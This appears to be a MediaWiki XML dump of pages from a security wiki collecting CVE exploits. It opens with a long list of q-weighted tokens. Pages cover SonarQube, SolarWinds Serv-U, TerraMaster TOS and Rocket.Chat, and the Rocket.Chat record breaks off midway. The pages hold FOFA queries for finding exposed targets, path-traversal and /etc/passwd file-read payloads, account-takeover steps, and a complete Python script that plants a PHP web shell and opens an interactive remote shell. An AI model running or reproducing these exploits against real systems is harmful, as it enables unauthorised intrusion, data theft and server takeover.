yrz;q=0.537, ysa;q=0.779, ysb;q=0.225, ysc;q=0.506, ysd;q=0.988, yse;q=0.799, ysf;q=0.552, ysg;q=0.364, ysh;q=0.051, ysi;q=0.184, ysj;q=0.046, ysk;q=0.250, ysl;q=0.387, ysm;q=0.977, ysn;q=0.249, yso;q=0.795, ysp;q=0.635, ysq;q=0.965, ysr;q=0.545, yss;q=0.697, yst;q=0.673, ysu;q=0.080, ysv;q=0.519, ysw;q=0.945, ysx;q=0.794, ysy;q=0.245, ysz;q=0.758, yta;q=0.724, ytb;q=0.334, ytc;q=0.322, ytd;q=0.353, yte;q=0.197, ytf;q=0.974, ytg;q=0.926, yth;q=0.535, yti;q=0.887, ytj;q=0.826, ytk;q=0.801, ytl;q=0.924, ytm;q=0.394, ytn;q=0.045, yto;q=0.720, ytp;q=0.005, ytq;q=0.009, ytr;q=0.339, yts;q=0.988, ytt;q=0.383, ytu;q=0.744, ytv;q=0.143, ytw;q=0.526, ytx;q=0.904, yty;q=0.409, ytz;q=0.537, yua;q=0.964, yub;q=0.022, yuc;q=0.599, yud;q=0.457, yue;q=0.382, yuf;q=0.079, yug;q=0.894, yuh;q=0.174, yui;q=0.419, yuj;q=0.655, yuk;q=0.601, yul;q=0.054, yum;q=0.116, yun;q=0.859, yuo;q=0.484, yup;q=0.100, yuq;q=0.395, yur;q=0.772, yus;q=0.128, yut;q=0.984, yuu;q=0.077, yuv;q=0.404, yuw;q=0.119, yux;q=0.618, yuy;q=0.601, yuz;q=0.392, yva;q=0.756, yvb;q=0.515, yvc;q=0.321, yvd;q=0.438, yve;q=0.905, yvf;q=0.415, yvg;q=0.409, yvh;q=0.962, yvi;q=0.918, yvj;q=0.716, yvk;q=0.571, yvl;q=0.197, yvm;q=0.511, yvn;q=0.181, yvo;q=0.630, yvp;q=0.483, yvq;q=0.059, yvr;q=0.888, yvs;q=0.995, yvt;q=0.330, yvu;q=0.006, yvv;q=0.022, yvw;q=0.877, yvx;q=0.032, yvy;q=0.818, yvz;q=0.014, ywa;q=0.389, ywb;q=0.960, ywc;q=0.757, ywd;q=0.259, ywe;q=0.329, ywf;q=0.267, ywg;q=0.896, ywh;q=0.351, ywi;q=0.500, ywj;q=0.638, ywk;q=0.555, ywl;q=0.600, ywm;q=0.009, ywn;q=0.796, ywo;q=0.363, ywp;q=0.834, ywq;q=0.141, ywr;q=0.144, yws;q=0.747, ywt;q=0.753, ywu;q=0.803, ywv;q=0.175, yww;q=0.605, ywx;q=0.155, ywy;q=0.277, ywz;q=0.811, yxa;q=0.344, yxb;q=0.885, yxc;q=0.868, yxd;q=0.432, yxe;q=0.558, yxf;q=0.092, yxg;q=0.077, yxh;q=0.425, yxi;q=0.957, yxj;q=0.968, yxk;q=0.743, yxl;q=0.509, yxm;q=0.392, yxn;q=0.343, yxo;q=0.699, yxp;q=0.663, yxq;q=0.433, yxr;q=0.189, yxs;q=0.815, yxt;q=0.222, yxu;q=0.240, yxv;q=0.503, yxw;q=0.751, yxx;q=0.833, yxy;q=0.866, yxz;q=0.476, yya;q=0.252, yyb;q=0.574, yyc;q=0.732, yyd;q=0.064, yye;q=0.044, yyf;q=0.061, yyg;q=0.696, yyh;q=0.646, yyi;q=0.109, yyj;q=0.905, yyk;q=0.977, yyl;q=0.242, yym;q=0.058, yyn;q=0.976, yyo;q=0.265, yyp;q=0.803, yyq;q=0.044, yyr;q=0.919, yys;q=0.549, yyt;q=0.420, yyu;q=0.469, yyv;q=0.017, yyw;q=0.788, yyx;q=0.634, yyy;q=0.308, yyz;q=0.047, yza;q=0.433, yzb;q=0.448, yzc;q=0.126, yzd;q=0.494, yze;q=0.917, yzf;q=0.378, yzg;q=0.549, yzh;q=0.506, yzi;q=0.330, yzj;q=0.991, yzk;q=0.617, yzl;q=0.801, yzm;q=0.125, yzn;q=0.362, yzo;q=0.979, yzp;q=0.266, yzq;q=0.743, yzr;q=0.294, yzs;q=0.034, yzt;q=0.328, yzu;q=0.775, yzv;q=0.305, yzw;q=0.415, yzx;q=0.858, yzy;q=0.203, yzz;q=0.450, zaa;q=0.919, zab;q=0.814, zac;q=0.409, zad;q=0.143, zae;q=0.188, zaf;q=0.471, zag;q=0.804, zah;q=0.585, zai;q=0.501, zaj;q=0.241, zak;q=0.018, zal;q=0.895, zam;q=0.078, zan;q=0.429, zao;q=0.799, zap;q=0.359, zaq;q=0.638, zar;q=0.211, zas;q=0.622, zat;q=0.531, zau;q=0.380, zav;q=0.043, zaw;q=0.796, zax;q=0.161, zay;q=0.733, zaz;q=0.276, zba;q=0.189, zbb;q=0.280, zbc;q=0.853, zbd;q=0.066, zbe;q=0.618, zbf;q=0.319, zbg;q=0.472, zbh;q=0.108, zbi;q=0.619, zbj;q=0.916, zbk;q=0.660, zbl;q=0.616, zbm;q=0.495, zbn;q=0.372, zbo;q=0.749, zbp;q=0.520, zbq;q=0.119, zbr;q=0.952, zbs;q=0.282, zbt;q=0.697, zbu;q=0.524, zbv;q=0.588, zbw;q=0.607, zbx;q=0.411, zby;q=0.608, zbz;q=0.499, zca;q=0.390, zcb;q=0.807, zcc;q=0.637, zcd;q=0.565, zce;q=0.330, zcf;q=0.899, zcg;q=0.988, zch;q=0.745, zci;q=0.057, zcj;q=0.037, zck;q=0.892, zcl;q=0.997, zcm;q=0.142, zcn;q=0.473, zco;q=0.364, zcp;q=0.440, zcq;q=0.556, zcr;q=0.817, zcs;q=0.240, zct;q=0.771, zcu;q=0.401, zcv;q=0.198, zcw;q=0.055, zcx;q=0.696, zcy;q=0.363, zcz;q=0.669, zda;q=0.987, zdb;q=0.775, zdc;q=0.728, zdd;q=0.046, zde;q=0.832, zdf;q=0.328, zdg;q=0.170, zdh;q=0.184, zdi;q=0.595, zdj;q=0.773, zdk;q=0.240, zdl;q=0.087, zdm;q=0.365, zdn;q=0.150, zdo;q=0.585, zdp;q=0.292, zdq;q=0.043, zdr;q=0.214, zds;q=0.638, zdt;q=0.684, zdu;q=0.755, zdv;q=0.632, zdw;q=0.174, zdx;q=0.308, zdy;q=0.527, zdz;q=0.151, zea;q=0.168, zeb;q=0.630, zec;q=0.809, zed;q=0.214, zee;q=0.463, zef;q=0.210, zeg;q=0.949, zeh;q=0.193, zei;q=0.949, zej;q=0.958, zek;q=0.975, zel;q=0.604, zem;q=0.061, zen;q=0.724, zeo;q=0.509, zep;q=0.194, zeq;q=0.644, zer;q=0.551, zes;q=0.450, zet;q=0.172, zeu;q=0.446, zev;q=0.556, zew;q=0.739, zex;q=0.740, zey;q=0.839, zez;q=0.489, zfa;q=0.305, zfb;q=0.598, zfc;q=0.678, zfd;q=0.578, zfe;q=0.720, zff;q=0.946, zfg;q=0.252, zfh;q=0.068, zfi;q=0.951, zfj;q=0.526, zfk;q=0.288, zfl;q=0.676, zfm;q=0.788, zfn;q=0.030, zfo;q=0.182, zfp;q=0.851, zfq;q=0.501, zfr;q=0.301, zfs;q=0.528, zft;q=0.514, zfu;q=0.601, zfv;q=0.819, zfw;q=0.893, zfx;q=0.848, zfy;q=0.756, zfz;q=0.106, zga;q=0.199, zgb;q=0.962, zgc;q=0.648, zgd;q=0.599, zge;q=0.268, zgf;q=0.473, zgg;q=0.405, zgh;q=0.982, zgi;q=0.572, zgj;q=0.259, zgk;q=0.260, zgl;q=0.133, zgm;q=0.411, zgn;q=0.521, zgo;q=0.720, zgp;q=0.212, zgq;q=0.284, zgr;q=0.259, zgs;q=0.030, zgt;q=0.536, zgu;q=0.594, zgv;q=0.843, zgw;q=0.605, zgx;q=0.733, zgy;q=0.505, zgz;q=0.451, zha;q=0.662, zhb;q=0.545, zhc;q=0.626, zhd;q=0.683, zhe;q=0.089, zhf;q=0.038, zhg;q=0.841, zhh;q=0.239, zhi;q=0.952, zhj;q=0.100, zhk;q=0.248, zhl;q=0.556, zhm;q=0.174, zhn;q=0.338, zho;q=0.627, zhp;q=0.209, zhq;q=0.788, zhr;q=0.165, zhs;q=0.539, zht;q=0.407, zhu;q=0.846, zhv;q=0.211, zhw;q=0.085, zhx;q=0.698, zhy;q=0.639, zhz;q=0.822, zia;q=0.424, zib;q=0.385, zic;q=0.960, zid;q=0.501, zie;q=0.587, zif;q=0.548, zig;q=0.037, zih;q=0.775, zii;q=0.653, zij;q=0.249, zik;q=0.244, zil;q=0.566, zim;q=0.068, zin;q=0.300, zio;q=0.001, zip;q=0.765, ziq;q=0.750, zir;q=0.345, zis;q=0.219, zit;q=0.127, ziu;q=0.455, ziv;q=0.477, ziw;q=0.704, zix;q=0.230, ziy;q=0.217, ziz;q=0.357, zja;q=0.324, zjb;q=0.338, zjc;q=0.287, zjd;q=0.513, zje;q=0.256, zjf;q=0.108, zjg;q=0.181, zjh;q=0.088, zji;q=0.135, zjj;q=0.583, zjk;q=0.929, zjl;q=0.932, zjm;q=0.260, zjn;q=0.674, zjo;q=0.191, zjp;q=0.033, zjq;q=0.829, zjr;q=0.035, zjs;q=0.544, zjt;q=0.405, zju;q=0.931, zjv;q=0.510, zjw;q=0.096, zjx;q=0.327, zjy;q=0.550, zjz;q=0.834, zka;q=0.745, zkb;q=0.292, zkc;q=0.093, zkd;q=0.962, zke;q=0.382, zkf;q=0.182, zkg;q=0.977, zkh;q=0.428, zki;q=0.952, zkj;q=0.845, zkk;q=0.613, zkl;q=0.633, zkm;q=0.113, zkn;q=0.407, zko;q=0.096, zkp;q=0.605, zkq;q=0.431, zkr;q=0.140, zks;q=0.624, zkt;q=0.937, zku;q=0.633, zkv;q=0.237, zkw;q=0.285, zkx;q=0.162, zky;q=0.467, zkz;q=0.047, zla;q=0.815, zlb;q=0.836, zlc;q=0.657, zld;q=0.770, zle;q=0.112, zlf;q=0.442, zlg;q=0.982, zlh;q=0.588, zli;q=0.043, zlj;q=0.210, zlk;q=0.460, zll;q=0.473, zlm;q=0.721, zln;q=0.473, zlo;q=0.308, zlp;q=0.992, zlq;q=0.615, zlr;q=0.219, zls;q=0.652, zlt;q=0.921, zlu;q=0.864, zlv;q=0.351, zlw;q=0.941, zlx;q=0.678, zly;q=0.880, zlz;q=0.021, zma;q=0.632, zmb;q=0.950, zmc;q=0.072, zmd;q=0.599, zme;q=0.038, zmf;q=0.296, zmg;q=0.815, zmh;q=0.104, zmi;q=0.424, zmj;q=0.695, zmk;q=0.500, zml;q=0.128, zmm;q=0.699, zmn;q=0.283, zmo;q=0.530, zmp;q=0.749, zmq;q=0.791, zmr;q=0.631, zms;q=0.541, zmt;q=0.464, zmu;q=0.012, zmv;q=0.316, zmw;q=0.774, zmx;q=0.970, zmy;q=0.371, zmz;q=0.668, zna;q=0.463, znb;q=0.138, znc;q=0.600, znd;q=0.953, zne;q=0.623, znf;q=0.797, zng;q=0.796, znh;q=0.321, zni;q=0.884, znj;q=0.631, znk;q=0.149, znl;q=0.974, znm;q=0.717, znn;q=0.221, zno;q=0.247, znp;q=0.398, znq;q=0.057, znr;q=0.356, zns;q=0.587, znt;q=0.754, znu;q=0.118, znv;q=0.093, znw;q=0.719, znx;q=0.337, zny;q=0.641, znz;q=0.476, zoa;q=0.130, zob;q=0.142, zoc;q=0.884, zod;q=0.290, zoe;q=0.544, zof;q=0.757, zog;q=0.562, zoh;q=0.798, zoi;q=0.035, zoj;q=0.223, zok;q=0.376, zol;q=0.592, zom;q=0.747, zon;q=0.927, zoo;q=0.076, zop;q=0.575, zoq;q=0.119, zor;q=0.587, zos;q=0.483, zot;q=0.713, zou;q=0.876, zov;q=0.882, zow;q=0.334, zox;q=0.498, zoy;q=0.347, zoz;q=0.238, zpa;q=0.731, zpb;q=0.630, zpc;q=0.662, zpd;q=0.891, zpe;q=0.500, zpf;q=0.789, zpg;q=0.841, zph;q=0.378, zpi;q=0.722, zpj;q=0.900, zpk;q=0.400, zpl;q=0.686, zpm;q=0.958, zpn;q=0.211, zpo;q=0.909, zpp;q=0.465, zpq;q=0.539, zpr;q=0.535, zps;q=0.063, zpt;q=0.929, zpu;q=0.586, zpv;q=0.816, zpw;q=0.939, zpx;q=0.447, zpy;q=0.696, zpz;q=0.567, zqa;q=0.985, zqb;q=0.981, zqc;q=0.116, zqd;q=0.779, zqe;q=0.620, zqf;q=0.443, zqg;q=0.233, zqh;q=0.091, zqi;q=0.880, zqj;q=0.588, zqk;q=0.647, zql;q=0.215, zqm;q=0.356, zqn;q=0.289, zqo;q=0.259, zqp;q=0.388, zqq;q=0.917, zqr;q=0.844, zqs;q=0.495, zqt;q=0.802, zqu;q=0.825, zqv;q=0.218, zqw;q=0.261, zqx;q=0.972, zqy;q=0.374, zqz;q=0.544, zra;q=0.255, zrb;q=0.820, zrc;q=0.384, zrd;q=0.879, zre;q=0.333, zrf;q=0.182, zrg;q=0.031, zrh;q=0.407, zri;q=0.063, zrj;q=0.084, zrk;q=0.715, zrl;q=0.854, zrm;q=0.998, zrn;q=0.611, zro;q=0.124, zrp;q=0.038, zrq;q=0.081, zrr;q=0.610, zrs;q=0.895, zrt;q=0.963, zru;q=0.915, zrv;q=0.554, zrw;q=0.751, zrx;q=0.788, zry;q=0.287, zrz;q=0.971, zsa;q=0.305, zsb;q=0.313, zsc;q=0.439, zsd;q=0.405, zse;q=0.172, zsf;q=0.816, zsg;q=0.203, zsh;q=0.707, zsi;q=0.443, zsj;q=0.575, zsk;q=0.474, zsl;q=0.623, zsm;q=0.094, zsn;q=0.823, zso;q=0.000, zsp;q=0.282, zsq;q=0.290, zsr;q=0.444, zss;q=0.634, zst;q=0.484, zsu;q=0.945, zsv;q=0.156, zsw;q=0.193, zsx;q=0.072, zsy;q=0.469, zsz;q=0.132, zta;q=0.807, ztb;q=0.859, ztc;q=0.383, ztd;q=0.626, zte;q=0.202, ztf;q=0.622, ztg;q=0.733, zth;q=0.286, zti;q=0.349, ztj;q=0.713, ztk;q=0.519, ztl;q=0.073, ztm;q=0.960, ztn;q=0.205, zto;q=0.525, ztp;q=0.833, ztq;q=0.089, ztr;q=0.839, zts;q=0.327, ztt;q=0.329, ztu;q=0.220, ztv;q=0.692, ztw;q=0.594, ztx;q=0.600, zty;q=0.253, ztz;q=0.489, zua;q=0.031, zub;q=0.213, zuc;q=0.733, zud;q=0.775, zue;q=0.253, zuf;q=0.164, zug;q=0.772, zuh;q=0.059, zui;q=0.395, zuj;q=0.739, zuk;q=0.108, zul;q=0.145, zum;q=0.626, zun;q=0.260, zuo;q=0.445, zup;q=0.741, zuq;q=0.980, zur;q=0.792, zus;q=0.287, zut;q=0.582, zuu;q=0.220, zuv;q=0.703, zuw;q=0.360, zux;q=0.429, zuy;q=0.380, zuz;q=0.845, zva;q=0.723, zvb;q=0.558, zvc;q=0.107, zvd;q=0.366, zve;q=0.725, zvf;q=0.620, zvg;q=0.069, zvh;q=0.353, zvi;q=0.688, zvj;q=0.549, zvk;q=0.609, zvl;q=0.761, zvm;q=0.282, zvn;q=0.739, zvo;q=0.971, zvp;q=0.660, zvq;q=0.836, zvr;q=0.391, zvs;q=0.278, zvt;q=0.406, zvu;q=0.472, zvv;q=0.349, zvw;q=0.033, zvx;q=0.407, zvy;q=0.287, zvz;q=0.678, zwa;q=0.262, zwb;q=0.330, zwc;q=0.381, zwd;q=0.441, zwe;q=0.603, zwf;q=0.752, zwg;q=0.808, zwh;q=0.772, zwi;q=0.088, zwj;q=0.746, zwk;q=0.122, zwl;q=0.399, zwm;q=0.096, zwn;q=0.801, zwo;q=0.488, zwp;q=0.616, zwq;q=0.616, zwr;q=0.300, zws;q=0.371, zwt;q=0.944, zwu;q=0.879, zwv;q=0.299, zww;q=0.619, zwx;q=0.184, zwy;q=0.669, zwz;q=0.599, zxa;q=0.422, zxb;q=0.550, zxc;q=0.495, zxd;q=0.746, zxe;q=0.944, zxf;q=0.201, zxg;q=0.340, zxh;q=0.198, zxi;q=0.726, zxj;q=0.995, zxk;q=0.262, zxl;q=0.636, zxm;q=0.953, zxn;q=0.666, zxo;q=0.169, zxp;q=0.382, zxq;q=0.538, zxr;q=0.038, zxs;q=0.872, zxt;q=0.349, zxu;q=0.353, zxv;q=0.092, zxw;q=0.891, zxx;q=0.477, zxy;q=0.365, zxz;q=0.422, zya;q=0.161, zyb;q=0.937, zyc;q=0.853, zyd;q=0.917, zye;q=0.675, zyf;q=0.541, zyg;q=0.001, zyh;q=0.286, zyi;q=0.283, zyj;q=0.894, zyk;q=0.022, zyl;q=0.129, zym;q=0.506, zyn;q=0.470, zyo;q=0.522, zyp;q=0.266, zyq;q=0.571, zyr;q=0.334, zys;q=0.709, zyt;q=0.138, zyu;q=0.968, zyv;q=0.455, zyw;q=0.466, zyx;q=0.115, zyy;q=0.574, zyz;q=0.971, zza;q=0.291, zzb;q=0.677, zzc;q=0.483, zzd;q=0.896, zze;q=0.999, zzf;q=0.045, zzg;q=0.183, zzh;q=0.838, zzi;q=0.585, zzj;q=0.775, zzk;q=0.715, zzl;q=0.124, zzm;q=0.843, zzn;q=0.279, zzo;q=0.793, zzp;q=0.679, zzq;q=0.753, zzr;q=0.636, zzs;q=0.054, zzt;q=0.807, zzu;q=0.180, zzv;q=0.411, zzw;q=0.386, zzx;q=0.119, zzy;q=0.204, zzz;q=0.225'
&lt;/pre&gt;</text>
      <sha1>2jzi6gimjjqm7htew8bi8jb4pqpm5ux</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-27986 SonarQube api 信息洩露漏洞</title>
    <ns>0</ns>
    <id>2318</id>
    <revision>
      <id>2754</id>
      <timestamp>2021-05-10T02:45:27Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==FOFA== &lt;pre&gt; app="sonarQube-代码管理" &lt;/pre&gt;   ==Payload== &lt;pre&gt; http://xxx.xxx.xxx.xxx/api/settings/values &lt;/pre&gt;"</comment>
      <origin>2754</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="120" sha1="csswl02h7isqj7f20tl7o6jmc6e9co7" xml:space="preserve">==FOFA==
&lt;pre&gt;
app="sonarQube-代码管理"
&lt;/pre&gt;


==Payload==
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/api/settings/values
&lt;/pre&gt;</text>
      <sha1>csswl02h7isqj7f20tl7o6jmc6e9co7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-27994 SolarWinds Serv-U FTP Server 15.2.1 目錄遍歷漏洞</title>
    <ns>0</ns>
    <id>3128</id>
    <revision>
      <id>3631</id>
      <timestamp>2021-05-30T02:54:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; Title: Path traversal     Product: SolarWinds Serv-U FTP Server     Vendor Homepage: https://www.solarwinds.com/     Vulnerable Version: 15.2.1 and lower     Fixed Versi..."</comment>
      <origin>3631</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2414" sha1="s46pyz45jkyte6oo1pzusmjab9lhtop" xml:space="preserve">&lt;pre&gt;
Title: Path traversal

 

Product: SolarWinds Serv-U FTP Server

 

Vendor Homepage: https://www.solarwinds.com/

 

Vulnerable Version: 15.2.1 and lower

 

Fixed Version: 15.2.2

 

CVE Number: CVE-2020-27994

 

Author: Jack Misiura from The Missing Link 

 

Website: https://www.themissinglink.com.au

 

Timeline:

 

2020-10-28 Disclosed to Vendor

2021-01-21 Vendor releases patched version

2021-08-02 Publication

 

1. Vulnerability Description

 

SolarWinds Serv-U File Server through 15.2.1 does not correctly validate path information, allowing the disclosure of files and directories outside of the user's home directory via a specially crafted GET request.

 

 

2. PoC

 

On a vulnerable Serv-U installation issue the following GET request to get a listing of files and directories above the user's directory:

 

https://&lt;serv-u host&gt;/Web Client/?Command=List&amp;dir=\..\*.*

 

The user *MUST* be locked to their directory, and only access granted must be the said directory. Directory listing must be enabled. If any of the above is not present, the exploit will not work.

 

3. Solution

 

The vendor provides an updated version (15.2.2) which should be installed immediately.

 

4. Advisory URL

 

https://www.themissinglink.com.au/security-advisories

 






Jack Misiura​


Application Security Consultant




a



9‑11 Dickson Avenue


Artarmon


NSW


2064



p


1300 865 865



os


+61 2 8436 8585



w


 &lt;https://www.themissinglink.com.au/&gt; themissinglink.com.au








 



 &lt;https://www.linkedin.com/company/the-missing-link-pty-ltd/&gt; 

 &lt;https://www.facebook.com/The-Missing-Link-268395013346228/?ref=bookmarks&gt; 

 &lt;https://twitter.com/TML_au&gt; 

 &lt;https://www.youtube.com/channel/UC2kd4mDmBs3SjW4lX3fFHnQ&gt; 

 &lt;https://www.instagram.com/the_missing_link_it/&gt; 




 



 &lt;https://www.themissinglink.com.au/our-inclusive-culture&gt; 





​CAUTION - This message may contain privileged and confidential information intended only for the use of the addressee named above. If you are not the intended recipient of this message you are hereby notified that any use, dissemination, distribution or reproduction of this message is prohibited. If you have received this message in error please notify The Missing Link immediately. Any views expressed in this message are those of the individual sender and may not necessarily reflect the views of The Missing Link.

 
&lt;/pre&gt;</text>
      <sha1>s46pyz45jkyte6oo1pzusmjab9lhtop</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-28185 TerraMaster TOS 用戶枚舉漏洞</title>
    <ns>0</ns>
    <id>2286</id>
    <revision>
      <id>2721</id>
      <timestamp>2021-05-07T09:13:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞利用== 輸入用戶名 admin 點擊確定，查看Burp捕獲的包  其中有一個請求包用於確認用戶admin是否存在  [[File:Tm-4.png | 600px ]]  存在..."</comment>
      <origin>2721</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="203" sha1="nn0o22r1l2xzy9jpgt4otwj0ur43ico" xml:space="preserve">==漏洞利用==
輸入用戶名 admin 點擊確定，查看Burp捕獲的包

其中有一個請求包用於確認用戶admin是否存在

[[File:Tm-4.png | 600px ]]

存在則返回用戶的郵箱信息</text>
      <sha1>nn0o22r1l2xzy9jpgt4otwj0ur43ico</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-28187 TerraMaster TOS 任意賬號密碼修改漏洞</title>
    <ns>0</ns>
    <id>2287</id>
    <revision>
      <id>2722</id>
      <timestamp>2021-05-07T09:14:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞利用== 首先需要知道已知用戶名，可以參考 [https://www.pwnwiki.org/index.php?title=CVE-2020-28185_TerraMaster_TOS_%E7%94%A8%E6%88%B6%E6%9E%9A%E8%88%89%..."</comment>
      <origin>2722</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="425" sha1="2x70xe97p5fq8fa5v0kwjcdhmir5j3q" xml:space="preserve">==漏洞利用==
首先需要知道已知用戶名，可以參考 [https://www.pwnwiki.org/index.php?title=CVE-2020-28185_TerraMaster_TOS_%E7%94%A8%E6%88%B6%E6%9E%9A%E8%88%89%E6%BC%8F%E6%B4%9E  CVE-2020-28185 TerraMaster TOS 用戶枚舉漏洞] 獲取已知的用戶名

重置頁面輸入獲取的賬號和郵箱

點擊確定，抓包更換郵箱接收驗證碼

通過接收的驗證碼即可更換賬號密碼登錄後台</text>
      <sha1>2x70xe97p5fq8fa5v0kwjcdhmir5j3q</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-28187 TerraMaster TOS 後台任意文件讀取漏洞</title>
    <ns>0</ns>
    <id>2288</id>
    <revision>
      <id>2723</id>
      <timestamp>2021-05-07T09:15:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響== TerraMaster TOS &lt; 4.2.06   ==Payload== &lt;pre&gt; /tos/index.php?editor/fileGet&amp;filename=../../../../../../etc/passwd &lt;/pre&gt;"</comment>
      <origin>2723</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="136" sha1="aiwqp1yy2gp12x58gnk37ezbaqt3mvx" xml:space="preserve">==漏洞影響==
TerraMaster TOS &lt; 4.2.06


==Payload==
&lt;pre&gt;
/tos/index.php?editor/fileGet&amp;filename=../../../../../../etc/passwd
&lt;/pre&gt;</text>
      <sha1>aiwqp1yy2gp12x58gnk37ezbaqt3mvx</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-28188 TerraMaster TOS RCE漏洞</title>
    <ns>0</ns>
    <id>2284</id>
    <revision>
      <id>2719</id>
      <timestamp>2021-05-07T09:09:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響== TerraMaster TOS &lt; 4.2.06  ==FOFA== &lt;pre&gt; "TerraMaster" &amp;&amp; header="TOS" &lt;/pre&gt;  ==POC== &lt;pre&gt; # Exploit Title: TerraMaster TOS 4.2.06 - RCE (Unauthenticated) #..."</comment>
      <origin>2719</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2822" sha1="jc443q5lswwrdg782wav95wktwpanjn" xml:space="preserve">==漏洞影響==
TerraMaster TOS &lt; 4.2.06

==FOFA==
&lt;pre&gt;
"TerraMaster" &amp;&amp; header="TOS"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
# Exploit Title: TerraMaster TOS 4.2.06 - RCE (Unauthenticated)
# Date: 12/12/2020
# Exploit Author: IHTeam
# Full Write-up: https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/
# Vendor Homepage: https://www.terra-master.com/
# Version: &lt;= 4.2.06
# Tested on: 4.1.30, 4.2.06

#!/usr/bin/env python3
import argparse
import requests
import time
import sys
import urllib.parse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

parser = argparse.ArgumentParser(description="TerraMaster TOS &lt;= 4.2.06 Unauth RCE")
parser.add_argument('--url', action='store', dest='url', required=True, help="Full URL and port e.g.: http://192.168.1.111:8081/")
args = parser.parse_args()

url = args.url
headers = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'}
epoch_time = int(time.time())
shell_filename = "debug"+str(epoch_time)+".php"

def check_endpoint(url, headers):
    response = requests.get(url+'/version', headers=headers, verify=False)
    if response.status_code == 200:
        print("[+] TerraMaster TOS version: ", str(response.content))
    else:
        print("\n[-] TerraMaster TOS response code: ", response.status_code)
        sys.exit()

def upload_shell(url, headers, shell_filename):
    payload = "http|echo \"&lt;?php echo(passthru(\\$_GET['cmd']));?&gt;\" &gt;&gt; /usr/www/"+shell_filename+" &amp;&amp; chmod +x /usr/www/"+shell_filename+"||"
    payload = urllib.parse.quote(payload, safe='')
    print("[/] Uploading shell...")
    response = requests.get(url+'/include/makecvs.php?Event='+payload, headers=headers, verify=False)
    time.sleep(1)
    response = requests.get(url+'/'+shell_filename+'?cmd=cat /etc/passwd', headers=headers, verify=False)
    if ('root:' in str(response.content, 'utf-8')):
        print("[+] Upload succeeded")
    else:
        print("\n[-] Error uploading shell: ", response.content)
        sys.exit()

def interactive_shell(url, headers, shell_filename, cmd):
    response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(cmd, safe=''), headers=headers, verify=False)
    print(str(response.text)+"\n")


def delete_shell(url, headers, shell_filename):
    delcmd = "rm /usr/www/"+shell_filename
    response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(delcmd, safe=''), headers=headers, verify=False)
    print("\n[+] Shell deleted")

upload_shell(url, headers, shell_filename)
try:
    while True:
        cmd = input("# ")
        interactive_shell(url, headers, shell_filename, cmd)
except:
    delete_shell(url, headers, shell_filename)
&lt;/pre&gt;</text>
      <sha1>jc443q5lswwrdg782wav95wktwpanjn</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-28208 Rocket.Chat 3.7.1 電子郵件地址枚舉漏洞</title>
    <ns>0</ns>
    <id>3273</id>
    <revision>
      <id>3823</id>
      <timestamp>2021-06-01T02:54:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==簡介== Rocket.Chat 3.7.1 及以下版本存在電子郵件地址枚舉漏洞。 &lt;/translate&gt;  ==POC== &lt;pre&gt; ################  Sample HTTP request..."</comment>
      <origin>3823</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2330" sha1="1a2po5qxplq94z2aktgz02hpfavlcko" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==簡介==
Rocket.Chat 3.7.1 及以下版本存在電子郵件地址枚舉漏洞。
&lt;/translate&gt;

==POC==
&lt;pre&gt;
################

Sample HTTP request sent with a registered email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
Host: localhost:3000
Content-Length: 122
Accept: */*
Content-Type: application/json


{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"positive@test.de\"],\"id\":\"3\"}"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The server response to a valid email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/1.1 200 OK
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-Instance-ID: DQDfuEfNLdbZr3zYH
Cache-Control: no-store
Pragma: no-cache
content-type: application/json
Vary: Accept-Encoding
